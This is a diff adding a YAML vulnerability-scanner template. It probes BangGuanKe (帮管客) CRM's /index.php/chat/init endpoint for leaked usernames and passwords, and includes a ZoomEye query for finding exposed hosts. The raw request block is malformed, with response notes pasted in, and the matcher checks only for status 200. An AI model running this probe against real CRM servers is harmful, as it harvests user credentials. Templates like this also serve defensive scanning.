@@ -1,0 +1,34 @@
+id: poc-gzwggklmg4oq3uly
+info:
+  name: 帮管客 存在用户信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzwggklmg4oq3uly'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzwggklmg4oq3uly
+    fofa: ZoomEye语法：app:"帮管客CRM"
+http:
+- raw:
+  - 'GET /index.php/chat/init HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?username)(?=.*?userpwd).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
